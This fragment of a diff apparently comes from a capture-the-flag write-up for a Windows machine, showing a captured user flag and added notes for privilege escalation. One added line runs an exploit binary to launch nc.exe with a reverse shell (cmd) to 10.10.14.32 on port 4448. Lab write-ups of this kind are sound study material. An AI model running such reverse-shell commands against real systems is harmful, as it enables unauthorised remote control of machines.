@@ -538,3 +538,11 @@ type "C:\Documents and Settings\Lakis\Desktop\user.txt"
 700c5dc163014e22b3e408f8703f67d1
 C:\>
 ```
+
+
+ /usr/share/windows-binaries/nc.exe
+
+.\exp.exe "C:\Inetpub\wwwroot\nc.exe 10.10.14.32 4448 -e cmd --no-shutdown"
+
+start call delay.bat ^1^> log.txt ^2^>^&^1
+
